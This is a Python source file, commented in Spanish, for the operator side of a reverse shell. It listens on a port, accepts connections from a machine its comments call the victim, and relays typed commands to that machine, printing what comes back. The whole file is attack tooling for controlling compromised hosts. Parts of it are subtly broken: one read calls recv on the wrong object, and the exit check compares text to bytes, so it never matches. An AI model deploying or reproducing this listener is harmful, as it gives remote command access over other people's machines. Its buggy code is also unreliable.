from os import kill
import threading
import socket
import sys
import requests, signal

# ! Terminar script CTRL + C
def sig_handler(sig, frame):
    print('[*] Exiting.....\n')
    sys.exit(0)
signal.signal(signal.SIGINT, sig_handler)

# ! Fin del comando
FIN_COMANDO = b'#00#'

def desplegar_salida_comando(salida):
    # ! Vienen en binario, espera la respuesta del servidor y despliega la salida
    salida = salida.decode('UTF-8') # ! str
    print(salida)

def leer_respuesta(socket):
    # ! Lee el canal de comunicacion del servidor y reconstruye el comando
    salida = socket.recv(2048)
    while not salida.endswith(FIN_COMANDO):
        salida += salida.recv(2048)
    quitar_caracteres = len(FIN_COMANDO)
    return salida[:-quitar_caracteres]

def mandar_comando(comando, socket):
    # ! Esperamos la respuesta del cliente(victima) y la retornamos
    comando = comando.encode('UTF-8') # * Convertimos a binario
    comando += FIN_COMANDO
    socket.send(comando)
    #print(comando)
    salida = leer_respuesta(socket)
    return salida

def leer_comandos(socket):
    #print(socket)
    comando = ''
    print('Welcome to Shell!')
    print('Start to write commands!')
    while comando != b'exit':
        comando = input('$> ') # ! Lee un str NO un binario
        respuesta = mandar_comando(comando, socket)
        desplegar_salida_comando(respuesta)

def inicializar_servidor(puerto):
    # * Creamos el socket
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind(('', int(puerto)))
    servidor.listen(5) # * Peticiones simultaneas
    while True:
        cliente, addr = servidor.accept()
        print('Connection received from {}'.format(addr))
        hilo_comandos = threading.Thread(target=leer_comandos, args=(cliente,))
        hilo_comandos.start()

if __name__ == '__main__':
    puerto = sys.argv[1] # * Pasamos el puerto
    socket = inicializar_servidor(puerto) 
